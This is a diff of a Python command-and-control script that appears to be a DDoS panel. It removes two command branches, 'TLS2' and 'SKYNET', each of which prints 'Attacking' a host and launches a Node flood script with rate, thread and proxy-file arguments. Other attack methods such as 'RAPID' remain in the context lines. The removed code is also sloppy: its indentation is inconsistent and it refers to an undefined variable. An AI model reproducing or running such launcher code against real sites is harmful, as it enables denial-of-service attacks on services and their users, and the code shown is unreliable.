@@ -95,34 +95,7 @@ def main():
             except IndexError:
                 print('Usage: METHOD URL TIME');
                 print('Example: METHOD URL TIME');
-                
-   
-     elif "TLS2" in cnc:
-   try:
-        host = cnc.split()[1]
-        time = cnc.split()[2]
-        print("Attacking " + host + " For " + time + " ")
-        os.system(f'node TLS2.js {host} {time} {Rate} {threads} {proxyFile}')
-    except IndexError:
-        print('Usage: TLS2 <host> <Time> <Rate> <threads>')
-        print('Example: TLS2 https://example.com 120 512 1000')
-
-
-
-   
-           elif "SKYNET" in cnc:  
-            try:
-                host = cnc.split()[1]
-                time = cnc.split()[2]
-                print("Attacking " + host + " For " + time + " ")
-               os.system(f'node TLS3.js {target} {time} {Rate} {threads} proxy.txt')
-            except IndexError:
-                print('Usage: Skynet <Target> <Time> <Rate> <threads> ')
-                print('Example: Skynet https://example.com 120 512 1000')
-                print(' Skynet ')             
-            
-            
-      
+           
                 
         elif "RAPID" in cnc:
             try: 
